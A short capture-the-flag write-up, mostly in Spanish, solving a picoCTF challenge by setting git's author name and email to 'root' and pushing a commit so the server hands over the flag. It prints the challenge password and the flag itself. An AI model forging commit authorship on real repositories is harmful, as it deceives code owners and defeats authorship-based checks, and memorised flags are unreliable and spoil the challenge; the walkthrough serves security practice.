## **Descripcion**
I have built my own Git server with my own rules! You can clone the challenge repo using the command below. `git clone ssh://git@foggy-cliff.picoctf.net:53238/git/challenge.git` Here's the password: `d9df7038` Check the README to get your flag!
## **Solucion**
picoCTF{1mp3rs0n4t4_g17_345y_e522152d}

## **Notas adicionales**
## Paso 1:
it clone ssh://git@foggy-cliff.picoctf.net:53238
password: `d9df7038`

## Paso 2:
Consulta el archivo README.
cd challenge  
 ls

## Paso 3:
git config user.name "root"  
git config user.email "root@picoctf"

Verificamoos 
git config user.name outputs root  
git config user.email outputs root@picoctf
## Paso 4:
Crear, agregar y confirmar flag.txt

echo "requesting flag" > flag.txt

git add flag.txt  
git commit -m "push flag as root"
 
## Paso 5:
Enviar al repositorio remoto

git branch
git push origin master
Ejecutando el ultimo comando saldra varias cosas pero el importante es este

"remote: Author matched and flag.txt found in commit...  
remote: Congratulations! You have successfully impersonated the root user  
remote: Here's your flag: picoCTF{1mp3rs0n4t4_g17_345y_e522152d}"

